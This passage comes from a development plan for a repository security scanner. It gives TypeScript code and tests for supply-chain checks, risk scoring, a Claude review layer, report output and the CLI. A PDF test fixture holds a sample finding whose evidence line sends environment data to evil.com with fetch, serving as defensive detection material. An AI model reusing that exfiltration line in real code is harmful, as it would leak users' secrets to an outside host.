- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/filesystem.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/filesystem.ts tests/rules/filesystem.test.ts
git commit -m "feat: implement filesystem access detection — path traversal, system dirs, privilege escalation"
```

---

### Task 12: Supply Chain rules (Category 8)

**Files:**
- Modify: `src/rules/supply-chain.ts`
- Create: `src/input/github.ts`
- Test: `tests/rules/supply-chain.test.ts`

- [ ] **Step 1: Implement GitHub metadata fetcher**

Create `src/input/github.ts`:
```typescript
import type { RepoMetadata } from '../rules/types.js';

export function parseGitHubUrl(url: string): { owner: string; repo: string } | null {
  const httpsMatch = url.match(/github\.com\/([^/]+)\/([^/.\s]+)/);
  if (httpsMatch) return { owner: httpsMatch[1], repo: httpsMatch[2] };
  const sshMatch = url.match(/git@github\.com:([^/]+)\/([^/.\s]+)/);
  if (sshMatch) return { owner: sshMatch[1], repo: sshMatch[2] };
  return null;
}

export async function fetchGitHubMetadata(url: string): Promise<Partial<RepoMetadata>> {
  const parsed = parseGitHubUrl(url);
  if (!parsed) return {};

  try {
    const response = await fetch(
      `https://api.github.com/repos/${parsed.owner}/${parsed.repo}`,
      { headers: { 'Accept': 'application/vnd.github.v3+json' }, signal: AbortSignal.timeout(10_000) }
    );
    if (!response.ok) return {};

    const data = await response.json() as any;
    return {
      stars: data.stargazers_count,
      age: data.created_at,
      contributors: undefined, // Requires separate API call
      isFork: data.fork,
      forkedFrom: data.parent?.full_name,
      defaultBranch: data.default_branch,
    };
  } catch {
    return {}; // Network failure — graceful degradation
  }
}
```

- [ ] **Step 2: Write supply chain tests**

Create `tests/rules/supply-chain.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { analyzeSupplyChain } from '../../src/rules/supply-chain.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';
import type { RepoMetadata } from '../../src/rules/types.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '' };
}

describe('analyzeSupplyChain', () => {
  it('flags star/age mismatch', () => {
    const metadata: Partial<RepoMetadata> = {
      stars: 10000,
      age: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(), // 1 week old
    };
    const findings = analyzeSupplyChain(metadata, []);
    expect(findings.some(f => f.description.includes('star'))).toBe(true);
  });

  it('flags missing license', () => {
    const files = [makeFile('package.json', '{}')]; // No LICENSE file
    const findings = analyzeSupplyChain({}, files);
    expect(findings.some(f => f.description.includes('license'))).toBe(true);
  });

  it('does not flag repos with license', () => {
    const files = [makeFile('LICENSE', 'MIT License...')];
    const findings = analyzeSupplyChain({}, files);
    expect(findings.every(f => !f.description.includes('license'))).toBe(true);
  });
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `npx vitest run tests/rules/supply-chain.test.ts`
Expected: FAIL

- [ ] **Step 4: Implement supply chain scanner**

Replace `src/rules/supply-chain.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding, RepoMetadata } from './types.js';
import { RiskCategory, Severity } from './types.js';

export function analyzeSupplyChain(
  metadata: Partial<RepoMetadata>,
  files: FileEntry[]
): Finding[] {
  const findings: Finding[] = [];

  // Star/age mismatch
  if (metadata.stars && metadata.age) {
    const ageMs = Date.now() - new Date(metadata.age).getTime();
    const ageDays = ageMs / (1000 * 60 * 60 * 24);
    if (metadata.stars > 1000 && ageDays < 30) {
      findings.push({
        severity: Severity.HIGH,
        category: RiskCategory.SUPPLY_CHAIN,
        file: '',
        line: 0,
        description: `Suspicious star/age ratio: ${metadata.stars} stars but only ${Math.round(ageDays)} days old. May be a fake or compromised repo.`,
        evidence: `Stars: ${metadata.stars}, Created: ${metadata.age}`,
        confidence: 0.7,
      });
    }
  }

  // Fork check
  if (metadata.isFork) {
    findings.push({
      severity: Severity.LOW,
      category: RiskCategory.SUPPLY_CHAIN,
      file: '',
      line: 0,
      description: `This is a fork of "${metadata.forkedFrom || 'unknown'}". Forks may contain modifications not in the original.`,
      evidence: `Forked from: ${metadata.forkedFrom || 'unknown'}`,
      confidence: 0.4,
    });
  }

  // Missing license
  const hasLicense = files.some(f =>
    /^(LICENSE|LICENCE|COPYING|LICENSE\.\w+|LICENCE\.\w+)$/i.test(
      f.relativePath.split('/').pop() || ''
    )
  );
  if (!hasLicense) {
    findings.push({
      severity: Severity.MEDIUM,
      category: RiskCategory.SUPPLY_CHAIN,
      file: '',
      line: 0,
      description: `No license file found. Using code without a license may have legal risks.`,
      evidence: 'No LICENSE, LICENCE, or COPYING file detected',
      confidence: 0.9,
    });
  }

  return findings;
}

// Wrapper to match the RuleModule signature
export async function scanSupplyChain(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  // Note: metadata is injected by the scanner orchestrator.
  // When called directly by the rule engine, we only do file-based checks.
  return analyzeSupplyChain({}, files);
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run tests/rules/supply-chain.test.ts`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/rules/supply-chain.ts src/input/github.ts tests/rules/supply-chain.test.ts
git commit -m "feat: implement supply chain detection — repo metadata anomalies, fork analysis, license check"
```

---

### Task 13: Verify all rule modules work together

- [ ] **Step 1: Unskip and update engine test for malicious repo detection**

In `tests/rules/engine.test.ts`, change `it.skip('finds issues in malicious repos'...` to `it('finds issues in malicious repos'...` (remove the `.skip`).

Run: `npx vitest run tests/rules/engine.test.ts`
Expected: PASS (both tests)

- [ ] **Step 2: Run full test suite**

Run: `npx vitest run`
Expected: All tests PASS

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "test: verify all 8 rule modules integrate correctly with engine"
```

---

## Chunk 5: Scoring & AI Review

### Task 14: Scoring system

**Files:**
- Create: `src/scoring/scorer.ts`
- Test: `tests/scoring/scorer.test.ts`

- [ ] **Step 1: Write scorer tests**

Create `tests/scoring/scorer.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { calculateCategoryScores, determineVerdict } from '../../src/scoring/scorer.js';
import { RiskCategory, Severity, Verdict } from '../../src/rules/types.js';
import type { Finding } from '../../src/rules/types.js';

describe('calculateCategoryScores', () => {
  it('returns 0 for categories with no findings', () => {
    const scores = calculateCategoryScores([], 'strict');
    expect(scores.every(s => s.score === 0)).toBe(true);
    expect(scores.every(s => s.level === 'NONE')).toBe(true);
  });

  it('scores higher for HIGH severity + high confidence', () => {
    const findings: Finding[] = [{
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'test.js', line: 1,
      description: 'test', evidence: 'test',
      confidence: 0.95,
    }];
    const scores = calculateCategoryScores(findings, 'strict');
    const dataScore = scores.find(s => s.category === RiskCategory.DATA_EXFILTRATION);
    expect(dataScore!.score).toBeGreaterThanOrEqual(7);
  });

  it('filters low-confidence findings in relaxed mode', () => {
    const findings: Finding[] = [{
      severity: Severity.HIGH,
      category: RiskCategory.OBFUSCATION,
      file: 'test.js', line: 1,
      description: 'test', evidence: 'test',
      confidence: 0.3,
    }];
    const scores = calculateCategoryScores(findings, 'relaxed');
    const obfScore = scores.find(s => s.category === RiskCategory.OBFUSCATION);
    expect(obfScore!.score).toBe(0);
  });
});

describe('determineVerdict', () => {
  it('returns GREEN when all scores are low', () => {
    const scores = Object.values(RiskCategory).map(cat => ({
      category: cat, score: 1, level: 'LOW' as const, findings: [],
    }));
    expect(determineVerdict(scores)).toBe(Verdict.GREEN);
  });

  it('returns YELLOW when any score is medium', () => {
    const scores = Object.values(RiskCategory).map(cat => ({
      category: cat, score: 0, level: 'NONE' as const, findings: [],
    }));
    scores[0] = { ...scores[0], score: 5, level: 'MEDIUM' };
    expect(determineVerdict(scores)).toBe(Verdict.YELLOW);
  });

  it('returns RED when any score is high', () => {
    const scores = Object.values(RiskCategory).map(cat => ({
      category: cat, score: 0, level: 'NONE' as const, findings: [],
    }));
    scores[0] = { ...scores[0], score: 8, level: 'HIGH' };
    expect(determineVerdict(scores)).toBe(Verdict.RED);
  });
});
```

- [ ] **Step 2: Implement scorer**

Create `src/scoring/scorer.ts`:
```typescript
import { RiskCategory, Severity, Verdict } from '../rules/types.js';
import type { Finding, CategoryScore } from '../rules/types.js';

const SEVERITY_WEIGHTS: Record<Severity, number> = {
  [Severity.LOW]: 1,
  [Severity.MEDIUM]: 3,
  [Severity.HIGH]: 6,
  [Severity.CRITICAL]: 10,
};

export function calculateCategoryScores(
  findings: Finding[],
  mode: 'strict' | 'relaxed'
): CategoryScore[] {
  const categories = Object.values(RiskCategory);

  return categories.map(category => {
    let categoryFindings = findings.filter(f => f.category === category);

    // In relaxed mode, filter out low-confidence findings
    if (mode === 'relaxed') {
      categoryFindings = categoryFindings.filter(f => f.confidence >= 0.7);
    }

    if (categoryFindings.length === 0) {
      return { category, score: 0, level: 'NONE' as const, findings: [] };
    }

    // Score = sum of (severity_weight * confidence), capped at 10
    const rawScore = categoryFindings.reduce((sum, f) => {
      return sum + SEVERITY_WEIGHTS[f.severity] * f.confidence;
    }, 0);

    const score = Math.min(10, Math.round(rawScore));
    const level = score === 0 ? 'NONE' : score <= 3 ? 'LOW' : score <= 6 ? 'MEDIUM' : 'HIGH';

    return { category, score, level: level as CategoryScore['level'], findings: categoryFindings };
  });
}

export function determineVerdict(scores: CategoryScore[]): Verdict {
  if (scores.some(s => s.level === 'HIGH')) return Verdict.RED;
  if (scores.some(s => s.level === 'MEDIUM')) return Verdict.YELLOW;
  return Verdict.GREEN;
}
```

- [ ] **Step 3: Run tests, verify pass**

Run: `npx vitest run tests/scoring/scorer.test.ts`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/scoring/scorer.ts tests/scoring/scorer.test.ts
git commit -m "feat: implement scoring system — category scores, confidence weighting, verdict logic"
```

---

### Task 15: AI Review layer

**Files:**
- Create: `src/ai/reviewer.ts`
- Create: `src/ai/prompts.ts`
- Test: `tests/ai/reviewer.test.ts`

- [ ] **Step 1: Write AI reviewer tests**

Create `tests/ai/reviewer.test.ts`:
```typescript
import { describe, it, expect, vi } from 'vitest';
import { AIReviewer } from '../../src/ai/reviewer.js';

describe('AIReviewer', () => {
  it('returns null when no API key is configured', async () => {
    const reviewer = new AIReviewer(undefined);
    const result = await reviewer.review([], 'packed content');
    expect(result).toBeNull();
  });

  it('builds the correct prompt structure', () => {
    const reviewer = new AIReviewer('test-key');
    const prompt = reviewer.buildPrompt(
      [{ severity: 'HIGH', category: 'data_exfiltration', file: 'test.js', line: 1, description: 'test', evidence: 'test', confidence: 0.8 }],
      'const x = 1;'
    );
    expect(prompt).toContain('security review');
    expect(prompt).toContain('data_exfiltration');
    expect(prompt).toContain('const x = 1');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/ai/reviewer.test.ts`
Expected: FAIL

- [ ] **Step 3: Create prompts file**

Create `src/ai/prompts.ts`:
```typescript
import type { Finding } from '../rules/types.js';

export const SYSTEM_PROMPT = `You are a security analyst reviewing a codebase for malicious code, data theft, privacy violations, and other risks. You are given:
1. Findings from a static analysis tool
2. The full source code of the repository

Your job is to:
- Validate or dismiss each static finding (reduce false positives)
- Identify any additional risks the static tool missed
- Provide a plain-English summary suitable for a non-technical user
- Give a clear recommendation: "safe to use", "use with caution", or "do not use"

Respond with valid JSON matching this schema:
{
  "refinedFindings": [{ "severity": "LOW|MEDIUM|HIGH|CRITICAL", "category": "...", "file": "...", "line": 0, "description": "...", "evidence": "...", "confidence": 0.0 }],
  "summary": "Plain English summary for non-technical users",
  "recommendation": "One sentence recommendation"
}`;

export function buildUserPrompt(findings: Finding[], packedCode: string): string {
  const findingsJson = JSON.stringify(findings, null, 2);
  return `## Static Analysis Findings

\`\`\`json
${findingsJson}
\`\`\`

## Repository Source Code

\`\`\`
${packedCode}
\`\`\`

Please perform your security review and return your analysis as JSON.`;
}
```

- [ ] **Step 4: Implement AI reviewer**

Create `src/ai/reviewer.ts`:
```typescript
import Anthropic from '@anthropic-ai/sdk';
import type { Finding } from '../rules/types.js';
import { SYSTEM_PROMPT, buildUserPrompt } from './prompts.js';

export interface AIReviewResult {
  refinedFindings: Finding[];
  summary: string;
  recommendation: string;
}

export class AIReviewer {
  private client: Anthropic | null;
  private model: string;

  constructor(apiKey: string | undefined, model?: string) {
    this.client = apiKey ? new Anthropic({ apiKey }) : null;
    this.model = model || process.env.REPOGUARD_MODEL || 'claude-sonnet-4-6';
  }

  buildPrompt(findings: Finding[], packedCode: string): string {
    return buildUserPrompt(findings as any[], packedCode);
  }

  async review(findings: Finding[], repoPath: string): Promise<AIReviewResult | null> {
    if (!this.client) return null;

    try {
      // Pack repo using Repomix
      const packedCode = await this.packRepo(repoPath, findings);

      const response = await this.client.messages.create({
        model: this.model,
        max_tokens: 4096,
        system: SYSTEM_PROMPT,
        messages: [{ role: 'user', content: this.buildPrompt(findings, packedCode) }],
      });

      const text = response.content
        .filter(b => b.type === 'text')
        .map(b => b.text)
        .join('');

      // Extract JSON from response (may be wrapped in markdown code blocks)
      const jsonMatch = text.match(/\{[\s\S]*\}/);
      if (!jsonMatch) return null;

      const parsed = JSON.parse(jsonMatch[0]) as AIReviewResult;
      return parsed;
    } catch (error) {
      console.warn(`AI review unavailable: ${error instanceof Error ? error.message : String(error)}`);
      return null;
    }
  }

  private async packRepo(repoPath: string, findings: Finding[]): Promise<string> {
    try {
      // Dynamically import repomix to pack the codebase
      const { pack } = await import('repomix');
      const result = await pack({
        input: { path: repoPath },
        output: { style: 'plain' },
      });

      // If packed output is too large (>100K tokens ~400KB), prioritize flagged files
      if (result && result.length > 400_000) {
        const flaggedFiles = new Set(findings.map(f => f.file));
        // Return only flagged file content + entry points
        return result.substring(0, 400_000) + '\n[... truncated for token limits]';
      }

      return result || '[Failed to pack repository]';
    } catch {
      return '[Repomix packing failed — AI review will be based on findings only]';
    }
  }
}
```

- [ ] **Step 5: Run tests, verify pass**

Run: `npx vitest run tests/ai/reviewer.test.ts`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/ai/ tests/ai/
git commit -m "feat: implement AI review layer — Claude integration, Repomix packing, prompt engineering"
```

---

## Chunk 6: Output Layer

### Task 16: Terminal output

**Files:**
- Create: `src/output/terminal.ts`
- Test: `tests/output/terminal.test.ts`

- [ ] **Step 1: Write terminal output tests**

Create `tests/output/terminal.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { renderTerminalReport } from '../../src/output/terminal.js';
import { RiskCategory, Severity, Verdict } from '../../src/rules/types.js';
import type { ScanResult } from '../../src/rules/types.js';

function makeScanResult(verdict: Verdict): ScanResult {
  return {
    repoMetadata: { localPath: '/repo' },
    findings: verdict === Verdict.RED ? [{
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'steal.js', line: 1,
      description: 'Sends .env to external server',
      evidence: 'fetch(...)', confidence: 0.9,
    }] : [],
    categoryScores: Object.values(RiskCategory).map(cat => ({
      category: cat,
      score: verdict === Verdict.RED && cat === RiskCategory.DATA_EXFILTRATION ? 9 : 0,
      level: (verdict === Verdict.RED && cat === RiskCategory.DATA_EXFILTRATION ? 'HIGH' : 'NONE') as any,
      findings: [],
    })),
    verdict,
    summary: 'Test summary',
    recommendation: 'Test recommendation',
    scanTimestamp: new Date().toISOString(),
    scanMode: 'strict',
    aiUsed: false,
  };
}

describe('renderTerminalReport', () => {
  it('includes the verdict', () => {
    const output = renderTerminalReport(makeScanResult(Verdict.GREEN));
    expect(output).toContain('GREEN');
  });

  it('includes category names', () => {
    const output = renderTerminalReport(makeScanResult(Verdict.GREEN));
    expect(output).toContain('Data Exfiltration');
    expect(output).toContain('Obfuscation');
  });

  it('includes findings for RED verdicts', () => {
    const output = renderTerminalReport(makeScanResult(Verdict.RED));
    expect(output).toContain('RED');
    expect(output).toContain('Sends .env');
  });

  it('includes recommendation', () => {
    const output = renderTerminalReport(makeScanResult(Verdict.GREEN));
    expect(output).toContain('Test recommendation');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/output/terminal.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement terminal renderer**

Create `src/output/terminal.ts`:
```typescript
import chalk from 'chalk';
import type { ScanResult, CategoryScore } from '../rules/types.js';
import { Verdict, RiskCategory } from '../rules/types.js';

const CATEGORY_LABELS: Record<string, string> = {
  [RiskCategory.DATA_EXFILTRATION]: 'Data Exfiltration',
  [RiskCategory.OBFUSCATION]: 'Obfuscated Code',
  [RiskCategory.INSTALL_SCRIPTS]: 'Install Scripts',
  [RiskCategory.BACKDOORS]: 'Backdoors',
  [RiskCategory.PRIVACY]: 'Privacy Violations',
  [RiskCategory.DEPENDENCIES]: 'Dependency Risks',
  [RiskCategory.FILESYSTEM]: 'Filesystem Access',
  [RiskCategory.SUPPLY_CHAIN]: 'Supply Chain Red Flags',
};

function verdictColor(verdict: Verdict): (text: string) => string {
  switch (verdict) {
    case Verdict.GREEN: return chalk.green;
    case Verdict.YELLOW: return chalk.yellow;
    case Verdict.RED: return chalk.red;
  }
}

function scoreBar(score: number): string {
  const filled = Math.round(score);
  const empty = 10 - filled;
  return '\u2588'.repeat(filled) + '\u2591'.repeat(empty);
}

function levelLabel(level: string): string {
  switch (level) {
    case 'HIGH': return chalk.red('HIGH');
    case 'MEDIUM': return chalk.yellow('MED ');
    case 'LOW': return chalk.green('LOW ');
    default: return chalk.gray('NONE');
  }
}

export function renderTerminalReport(result: ScanResult): string {
  const lines: string[] = [];
  const colorFn = verdictColor(result.verdict);
  const repoName = result.repoMetadata.url?.split('/').pop() || result.repoMetadata.localPath.split(/[/\\]/).pop() || 'repo';

  lines.push('');
  lines.push(colorFn(`  RepoGuard Report: ${repoName}`));
  lines.push(colorFn(`  Verdict: ${result.verdict}`));
  lines.push('');

  // Category bars
  for (const score of result.categoryScores) {
    const label = (CATEGORY_LABELS[score.category] || score.category).padEnd(22);
    lines.push(`  ${label} ${scoreBar(score.score)}  ${levelLabel(score.level)}`);
  }

  // Top findings
  const topFindings = result.findings
    .sort((a, b) => b.confidence - a.confidence)
    .slice(0, 3);

  if (topFindings.length > 0) {
    lines.push('');
    lines.push('  Top Findings:');
    lines.push('');
    for (const f of topFindings) {
      const icon = f.severity === 'CRITICAL' || f.severity === 'HIGH' ? chalk.red('!') : chalk.yellow('*');
      lines.push(`  ${icon} ${f.description}`);
      if (f.file) lines.push(`    ${chalk.gray(`${f.file}:${f.line}`)}`);
      lines.push('');
    }
  }

  lines.push(`  Recommendation: ${result.recommendation}`);
  lines.push('');

  return lines.join('\n');
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/output/terminal.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/output/terminal.ts tests/output/terminal.test.ts
git commit -m "feat: implement terminal output — traffic light verdict, risk bars, findings summary"
```

---

### Task 17: PDF report generation

**Files:**
- Create: `src/output/pdf.ts`
- Test: `tests/output/pdf.test.ts`

- [ ] **Step 1: Write PDF output tests**

Create `tests/output/pdf.test.ts`:
```typescript
import { describe, it, expect, afterEach } from 'vitest';
import { generatePDF } from '../../src/output/pdf.js';
import { existsSync, unlinkSync, statSync } from 'node:fs';
import { RiskCategory, Severity, Verdict } from '../../src/rules/types.js';
import type { ScanResult } from '../../src/rules/types.js';

const TEST_PDF = './test-output.pdf';

function makeScanResult(): ScanResult {
  return {
    repoMetadata: { localPath: '/repo', stars: 100, age: '2025-01-01' },
    findings: [{
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'steal.js', line: 42,
      description: 'Sends .env to external server',
      evidence: 'fetch("https://evil.com", { body: env })',
      confidence: 0.9,
    }],
    categoryScores: Object.values(RiskCategory).map(cat => ({
      category: cat, score: 0, level: 'NONE' as const, findings: [],
    })),
    verdict: Verdict.RED,
    summary: 'High-risk repository detected.',
    recommendation: 'DO NOT USE this repository.',
    scanTimestamp: new Date().toISOString(),
    scanMode: 'strict',
    aiUsed: false,
  };
}

afterEach(() => {
  if (existsSync(TEST_PDF)) unlinkSync(TEST_PDF);
});

describe('generatePDF', () => {
  it('creates a PDF file', async () => {
    await generatePDF(makeScanResult(), TEST_PDF);
    expect(existsSync(TEST_PDF)).toBe(true);
  });

  it('PDF has non-zero size', async () => {
    await generatePDF(makeScanResult(), TEST_PDF);
    const stat = statSync(TEST_PDF);
    expect(stat.size).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/output/pdf.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement PDF generator**

Create `src/output/pdf.ts`:
```typescript
import PDFDocument from 'pdfkit';
import { createWriteStream } from 'node:fs';
import type { ScanResult, CategoryScore, Finding } from '../rules/types.js';
import { RiskCategory, Verdict } from '../rules/types.js';

const CATEGORY_LABELS: Record<string, string> = {
  [RiskCategory.DATA_EXFILTRATION]: 'Data Exfiltration',
  [RiskCategory.OBFUSCATION]: 'Obfuscated Code',
  [RiskCategory.INSTALL_SCRIPTS]: 'Install Scripts',
  [RiskCategory.BACKDOORS]: 'Backdoors',
  [RiskCategory.PRIVACY]: 'Privacy Violations',
  [RiskCategory.DEPENDENCIES]: 'Dependency Risks',
  [RiskCategory.FILESYSTEM]: 'Filesystem Access',
  [RiskCategory.SUPPLY_CHAIN]: 'Supply Chain Red Flags',
};

const VERDICT_COLORS: Record<string, string> = {
  [Verdict.GREEN]: '#22c55e',
  [Verdict.YELLOW]: '#eab308',
  [Verdict.RED]: '#ef4444',
};

export async function generatePDF(result: ScanResult, outputPath: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const doc = new PDFDocument({ margin: 50 });
    const stream = createWriteStream(outputPath);
    doc.pipe(stream);

    // === Page 1: Executive Summary ===
    doc.fontSize(24).text('RepoGuard Security Report', { align: 'center' });
    doc.moveDown();

    // Verdict
    const verdictColor = VERDICT_COLORS[result.verdict] || '#666';
    doc.fontSize(18).fillColor(verdictColor)
      .text(`Verdict: ${result.verdict}`, { align: 'center' });
    doc.fillColor('#000');
    doc.moveDown();

    // Summary
    doc.fontSize(12).text(result.summary);
    doc.moveDown();

    // Category scores
    doc.fontSize(14).text('Risk Categories', { underline: true });
    doc.moveDown(0.5);

    for (const score of result.categoryScores) {
      const label = CATEGORY_LABELS[score.category] || score.category;
      doc.fontSize(10).text(`${label}: ${score.score}/10 (${score.level})`);
    }
    doc.moveDown();

    // Top findings
    const topFindings = result.findings
      .sort((a, b) => b.confidence - a.confidence)
      .slice(0, 3);

    if (topFindings.length > 0) {
      doc.fontSize(14).text('Top Findings', { underline: true });
      doc.moveDown(0.5);
      for (const f of topFindings) {
        doc.fontSize(10)
          .text(`[${f.severity}] ${f.description}`)
          .text(`  File: ${f.file}:${f.line}`, { indent: 10 })
          .moveDown(0.5);
      }
    }

    // Recommendation
    doc.moveDown();
    doc.fontSize(12).fillColor(verdictColor)
      .text(`Recommendation: ${result.recommendation}`);
    doc.fillColor('#000');

    // === Pages 2-N: Detailed Findings ===
    const categoriesWithFindings = result.categoryScores.filter(s => s.findings.length > 0);

    for (const catScore of categoriesWithFindings) {
      doc.addPage();
      const label = CATEGORY_LABELS[catScore.category] || catScore.category;
      doc.fontSize(16).text(`${label} (Score: ${catScore.score}/10)`);
      doc.moveDown();

      for (const finding of catScore.findings) {
        doc.fontSize(10)
          .text(`Severity: ${finding.severity} | Confidence: ${(finding.confidence * 100).toFixed(0)}%`)
          .text(finding.description)
          .text(`File: ${finding.file}:${finding.line}`, { indent: 10 })
          .text(`Evidence: ${finding.evidence.substring(0, 200)}`, { indent: 10 })
          .moveDown();
      }
    }

    // === Final Page: Metadata ===
    doc.addPage();
    doc.fontSize(16).text('Repository Metadata');
    doc.moveDown();
    doc.fontSize(10);
    if (result.repoMetadata.url) doc.text(`URL: ${result.repoMetadata.url}`);
    if (result.repoMetadata.stars !== undefined) doc.text(`Stars: ${result.repoMetadata.stars}`);
    if (result.repoMetadata.age) doc.text(`Created: ${result.repoMetadata.age}`);
    if (result.repoMetadata.contributors) doc.text(`Contributors: ${result.repoMetadata.contributors}`);
    if (result.repoMetadata.isFork) doc.text(`Fork of: ${result.repoMetadata.forkedFrom || 'unknown'}`);
    doc.text(`Scan Mode: ${result.scanMode}`);
    doc.text(`AI Used: ${result.aiUsed ? 'Yes' : 'No'}`);
    doc.text(`Scan Time: ${result.scanTimestamp}`);

    doc.end();
    stream.on('finish', resolve);
    stream.on('error', reject);
  });
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/output/pdf.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/output/pdf.ts tests/output/pdf.test.ts
git commit -m "feat: implement PDF report generation — executive summary, detailed findings, metadata"
```

---

## Chunk 7: Scanner Orchestrator & CLI

### Task 18: Scanner orchestrator

**Files:**
- Create: `src/scanner.ts`
- Test: `tests/scanner.test.ts`

- [ ] **Step 1: Write scanner tests**

Create `tests/scanner.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scan } from '../src/scanner.js';

describe('scan', () => {
  it('scans a safe local repo and returns GREEN', async () => {
    const result = await scan('tests/fixtures/safe-repo', { mode: 'strict', ai: false });
    expect(result.verdict).toBe('GREEN');
    expect(result.findings.length).toBe(0);
  });

  it('scans a malicious local repo and returns RED', async () => {
    const result = await scan('tests/fixtures/malicious-repo', { mode: 'strict', ai: false });
    expect(result.verdict).toBe('RED');
    expect(result.findings.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Implement scanner**

Create `src/scanner.ts` — the main orchestrator:
```typescript
import { detectInputType, validateLocalPath, cloneRepo, cleanupClone } from './input/handler.js';
import { checkConstraints } from './input/constraints.js';
import { fetchGitHubMetadata } from './input/github.js';
import { RuleEngine } from './rules/engine.js';
import { analyzeSupplyChain } from './rules/supply-chain.js';
import { calculateCategoryScores, determineVerdict } from './scoring/scorer.js';
import { AIReviewer } from './ai/reviewer.js';
import type { ScanResult, RepoMetadata } from './rules/types.js';

interface ScanOptions {
  mode: 'strict' | 'relaxed';
  ai: boolean;
  apiKey?: string;
  model?: string;
}

export async function scan(input: string, options: ScanOptions): Promise<ScanResult> {
  // 1. Resolve input (clone if URL, validate if local)
  const inputType = detectInputType(input);
  let repoPath: string;
  let shouldCleanup = false;

  if (inputType === 'url') {
    repoPath = cloneRepo(input);
    shouldCleanup = true;
  } else {
    const validation = await validateLocalPath(input);
    if (!validation.valid) throw new Error(validation.error);
    repoPath = validation.resolvedPath;
  }

  try {
    // 2. Check constraints
    const constraints = await checkConstraints(repoPath);
    if (!constraints.passed) throw new Error(constraints.error);

    // 3. Fetch GitHub metadata if URL was provided
    let metadata: RepoMetadata = { localPath: repoPath, url: inputType === 'url' ? input : undefined };
    if (inputType === 'url') {
      const ghMeta = await fetchGitHubMetadata(input);
      metadata = { ...metadata, ...ghMeta };
    }

    // 4. Run static rule engine
    const engine = new RuleEngine();
    const files = await engine.collectFiles(repoPath);
    const engineFindings = await engine.scan(repoPath);

    // 5. Run supply chain analysis with metadata (separate from engine to pass metadata)
    const supplyChainFindings = analyzeSupplyChain(metadata, files);

    const findings = [...constraints.findings, ...engineFindings, ...supplyChainFindings];

    // 6. AI review (optional)
    let aiFindings = findings;
    let summary = '';
    let recommendation = '';
    let aiUsed = false;

    if (options.ai && options.apiKey) {
      const reviewer = new AIReviewer(options.apiKey, options.model);
      const aiResult = await reviewer.review(findings, repoPath);
      if (aiResult) {
        aiFindings = aiResult.refinedFindings;
        summary = aiResult.summary;
        recommendation = aiResult.recommendation;
        aiUsed = true;
      }
    }

    // 7. Score
    const categoryScores = calculateCategoryScores(aiFindings, options.mode);
    const verdict = determineVerdict(categoryScores);

    // 8. Generate summary if AI didn't
    if (!summary) {
      const topFindings = aiFindings
        .sort((a, b) => b.confidence - a.confidence)
        .slice(0, 3)
        .map(f => f.description);
      summary = topFindings.join(' ') || 'No significant issues detected.';
    }
    if (!recommendation) {
      recommendation = verdict === 'GREEN'
        ? 'This repository appears safe to use.'
        : verdict === 'YELLOW'
          ? 'Review the flagged items before using this repository.'
          : 'DO NOT USE this repository. Significant risks detected.';
    }

    return {
      repoMetadata: metadata,
      findings: aiFindings,
      categoryScores,
      verdict,
      summary,
      recommendation,
      scanTimestamp: new Date().toISOString(),
      scanMode: options.mode,
      aiUsed,
    };
  } finally {
    if (shouldCleanup) cleanupClone(repoPath);
  }
}
```

- [ ] **Step 3: Run tests, verify pass, commit**

```bash
git add src/scanner.ts tests/scanner.test.ts
git commit -m "feat: implement scanner orchestrator — ties input, rules, scoring, AI together"
```

---

### Task 19: CLI setup

**Files:**
- Create: `bin/repoguard.ts`
- Create: `src/cli.ts`
- Create: `src/index.ts`

- [ ] **Step 1: Create CLI entry point**

Create `bin/repoguard.ts`:
```typescript
#!/usr/bin/env node
import { run } from '../src/cli.js';
run();
```

- [ ] **Step 2: Implement CLI with Commander**

Create `src/cli.ts`:
```typescript
import { Command } from 'commander';
import { scan } from './scanner.js';
import { renderTerminalReport } from './output/terminal.js';
import { generatePDF } from './output/pdf.js';

export function run(): void {
  const program = new Command();

  program
    .name('repoguard')
    .description('Security scanner for GitHub repositories')
    .version('1.0.0');

  program
    .command('scan <target>')
    .description('Scan a GitHub repo URL or local directory')
    .option('--mode <mode>', 'Scan mode: strict or relaxed', 'strict')
    .option('--no-ai', 'Skip AI review (static analysis only)')
    .option('--model <model>', 'Claude model to use (or set REPOGUARD_MODEL env var)', process.env.REPOGUARD_MODEL || 'claude-sonnet-4-6')
    .option('--submit', 'Submit results to community database')
    .option('--output <path>', 'Custom PDF output path')
    .action(async (target, options) => {
      try {
        const apiKey = process.env.ANTHROPIC_API_KEY;
